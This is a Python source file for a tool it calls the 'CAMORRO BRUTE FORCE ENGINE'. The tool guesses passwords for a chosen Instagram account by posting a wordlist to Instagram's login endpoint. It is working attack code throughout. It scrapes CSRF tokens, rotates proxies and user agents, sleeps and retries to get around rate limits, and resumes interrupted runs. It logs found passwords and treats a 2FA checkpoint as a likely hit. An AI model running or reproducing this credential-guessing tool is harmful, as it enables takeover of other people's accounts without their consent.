import re
import time
import random
import json
import requests
from typing import Optional, List
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    Progress, SpinnerColumn, TextColumn, BarColumn,
    MofNCompleteColumn, TimeElapsedColumn, TimeRemainingColumn,
)
from rich.table import Table

from modules.utils import ensure_dirs, BASE, clean_username, append_found, load_config
from modules.proxy import ProxyPool

console = Console()


class BruteForce:
    LOGIN_PAGE = "https://www.instagram.com/accounts/login/"
    LOGIN_API = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"

    def __init__(
        self,
        username: str,
        passwords: List[str],
        delay_min: float = 3.0,
        delay_max: float = 5.0,
        proxy_pool: Optional[ProxyPool] = None,
        resume: bool = True,
        rotate_every: int = 10,
        rate_sleep: int = 60,
    ):
        self.username = clean_username(username)
        self.passwords = passwords
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.proxy_pool = proxy_pool or ProxyPool("__none__")
        self.resume = resume
        self.rotate_every = rotate_every
        self.rate_sleep = rate_sleep

        self.found = None
        self.attempts = 0
        self.rate_hits = 0
        self.session = requests.Session()
        self.csrf = None
        self.current_proxy = None
        self.start_index = 0
        self.state_file = BASE / "sessions" / f"progress_{self.username}.json"

        if resume:
            self._load_progress()

    def _load_progress(self):
        ensure_dirs()
        if self.state_file.exists():
            try:
                data = json.loads(self.state_file.read_text(encoding="utf-8"))
                self.start_index = int(data.get("index", 0))
                console.print(
                    f"[yellow][!] Resume enabled → starting at {self.start_index}/{len(self.passwords)}[/yellow]"
                )
            except Exception:
                self.start_index = 0

    def _save_progress(self, index: int):
        ensure_dirs()
        self.state_file.write_text(
            json.dumps({"index": index, "username": self.username}, indent=2),
            encoding="utf-8",
        )

    def _clear_progress(self):
        if self.state_file.exists():
            self.state_file.unlink()

    def _ua(self) -> str:
        return random.choice([
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        ])

    def _pick_proxy(self):
        if self.proxy_pool:
            self.current_proxy = self.proxy_pool.next()

    def init_session(self) -> bool:
        console.print("[*] Initializing session...")
        self.session = requests.Session()
        self._pick_proxy()
        self.session.headers.update({
            "User-Agent": self._ua(),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "X-IG-App-ID": "936619743392459",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.instagram.com",
            "Referer": self.LOGIN_PAGE,
        })
        proxies = self.proxy_pool.as_requests(self.current_proxy) if self.proxy_pool else {}
        try:
            r = self.session.get(self.LOGIN_PAGE, timeout=20, proxies=proxies)
            self.csrf = self.session.cookies.get("csrftoken")
            if not self.csrf:
                m = re.search(r'"csrf_token":"([^"]+)"', r.text)
                if m:
                    self.csrf = m.group(1)
            if not self.csrf:
                console.print("[red][✗] CSRF not found[/red]")
                return False
            console.print(f"[green][✓] Session OK | CSRF: {self.csrf[:12]}...[/green]")
            if self.current_proxy:
                console.print(f"[dim]    Proxy: {self.current_proxy}[/dim]")
            return True
        except Exception as e:
            console.print(f"[red][✗] Session init failed: {e}[/red]")
            return False

    def _try_one(self, password: str) -> str:
        if not self.csrf and not self.init_session():
            return "error"

        ts = int(time.time())
        # Browser password format (works on many IG web flows)
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"
        headers = {
            "X-CSRFToken": self.csrf,
            "X-Requested-With": "XMLHttpRequest",
            "X-IG-App-ID": "936619743392459",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": self.LOGIN_PAGE,
        }
        data = {
            "username": self.username,
            "enc_password": enc_password,
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "stopDeletionNonce": "",
            "trustedDeviceRecords": "{}",
        }
        proxies = self.proxy_pool.as_requests(self.current_proxy) if self.proxy_pool else {}

        try:
            r = self.session.post(self.LOGIN_API, headers=headers, data=data,
                                  timeout=20, proxies=proxies)
            if self.session.cookies.get("csrftoken"):
                self.csrf = self.session.cookies.get("csrftoken")

            body = r.text.lower()
            try:
                j = r.json()
            except Exception:
                j = {}

            if j.get("authenticated") is True or (
                j.get("status") == "ok" and j.get("user")
            ):
                return "success"

            if (
                "checkpoint_required" in body
                or j.get("checkpoint_url")
                or j.get("two_factor_required")
            ):
                return "checkpoint"

            if r.status_code in (429, 403) or "please wait" in body or "rate" in body or "spam" in body:
                return "rate"

            if j.get("authenticated") is False or "invalid" in body or j.get("status") == "fail":
                return "invalid"

            if "checkpoint" in body:
                return "checkpoint"
            return "invalid"
        except requests.RequestException:
            return "error"

    def run(self) -> Optional[str]:
        total = len(self.passwords)
        remaining = self.passwords[self.start_index:]
        console.print(Panel.fit(
            f"[bold red]⚡ CAMORRO BRUTE FORCE ENGINE[/bold red]\n"
            f"Target: [cyan]@{self.username}[/cyan]\n"
            f"Total: [green]{total}[/green] | Resume from: [yellow]{self.start_index}[/yellow]\n"
            f"Left: [green]{len(remaining)}[/green]\n"
            f"Delay: [yellow]{self.delay_min}-{self.delay_max}s[/yellow] | "
            f"Proxies: [yellow]{len(self.proxy_pool)}[/yellow]",
            border_style="red",
        ))

        if not remaining:
            console.print("[yellow]Nothing left to test[/yellow]")
            return None
        if not self.init_session():
            return None

        console.print("[*] Starting attack...\n")

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold red]{task.fields[pwd]}[/bold red]"),
            BarColumn(bar_width=28),
            MofNCompleteColumn(),
            TextColumn("{task.percentage:>5.1f}%"),
            TextColumn("•"),
            TextColumn("{task.fields[rate]} pwd/s"),
            TextColumn("•"),
            TimeElapsedColumn(),
            TextColumn("ETA"),
            TimeRemainingColumn(),
            console=console,
            refresh_per_second=4,
        ) as progress:
            task = progress.add_task(
                "brute",
                total=len(remaining),
                pwd="starting...",
                rate="0.00",
            )
            start = time.time()
            cfg = load_config()
            save_every = int(cfg.get("save_every", 25))

            idx = self.start_index
            i = 0
            while i < len(remaining):
                pwd = remaining[i]
                status = self._try_one(pwd)
                self.attempts += 1
                elapsed = max(time.time() - start, 0.001)
                rate = f"{self.attempts / elapsed:.2f}"
                progress.update(task, advance=1, pwd=pwd[:26], rate=rate)

                abs_index = idx + 1
                if abs_index % save_every == 0:
                    self._save_progress(abs_index)

                # rotate proxy
                if self.proxy_pool and self.attempts % self.rotate_every == 0:
                    self.init_session()

                if status == "success":
                    self.found = pwd
                    console.print(f"\n[bold green]🏆 PASSWORD FOUND: {pwd}[/bold green]")
                    append_found(self.username, pwd, "authenticated")
                    self._clear_progress()
                    break

                if status == "checkpoint":
                    self.found = pwd
                    console.print(
                        f"\n[bold yellow]⚠️ CHECKPOINT/2FA — likely correct: {pwd}[/bold yellow]"
                    )
                    append_found(self.username, pwd, "checkpoint")
                    self._clear_progress()
                    break

                if status == "rate":
                    self.rate_hits += 1
                    console.print(
                        f"\n[yellow][!] Rate-limit — sleep {self.rate_sleep}s + new session "
                        f"(will RETRY same password)[/yellow]"
                    )
                    time.sleep(self.rate_sleep)
                    self.init_session()
                    # retry same password (no i += 1)
                    progress.update(task, advance=-1)
                    continue

                if status == "error":
                    time.sleep(5)
                    self.init_session()
                    # retry once-ish
                    progress.update(task, advance=-1)
                    continue

                i += 1
                idx += 1
                time.sleep(random.uniform(self.delay_min, self.delay_max))

            # if finished without find, clear progress
            if not self.found and i >= len(remaining):
                self._clear_progress()

        self.summary()
        return self.found

    def summary(self):
        t = Table(title="📊 Attack Summary")
        t.add_column("Metric", style="cyan")
        t.add_column("Value", style="green")
        t.add_row("Target", f"@{self.username}")
        t.add_row("Tried", str(self.attempts))
        t.add_row("Rate-limits", str(self.rate_hits))
        t.add_row("Proxies", str(len(self.proxy_pool)))
        t.add_row("Result", self.found if self.found else "Not found")
        console.print(t)
